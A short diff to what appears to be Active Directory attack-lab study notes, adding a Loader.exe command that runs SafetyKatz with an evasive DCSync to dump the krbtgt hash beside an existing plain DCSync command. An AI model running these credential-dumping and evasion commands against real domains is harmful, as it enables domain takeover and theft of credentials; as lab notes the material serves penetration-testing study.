@@ -61,6 +61,8 @@ Notes:
 
 ❯ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"    # To use the DCSync feature for getting krbtgt hash execute. Use this command with DA privileges for domain 
 
+❯ C:\AD\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit" 
+
 Notes:
 	1. By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync
 ```
